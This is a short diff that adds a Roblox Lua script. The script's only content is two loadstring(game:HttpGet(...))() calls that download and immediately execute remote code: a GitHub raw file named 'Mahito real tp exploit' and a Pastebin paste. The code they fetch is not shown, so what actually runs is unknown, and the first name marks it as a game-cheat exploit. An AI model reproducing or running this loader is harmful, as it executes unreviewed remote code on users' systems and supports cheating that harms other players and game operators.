@@ -1,0 +1,5 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/Kenjihin69/Kenjihin69/refs/heads/main/Mahito%20real%20tp%20exploit'))()
+
+task.wait(0.1)
+
+loadstring(game:HttpGet('https://pastebin.com/raw/q4vcEv2S'))()
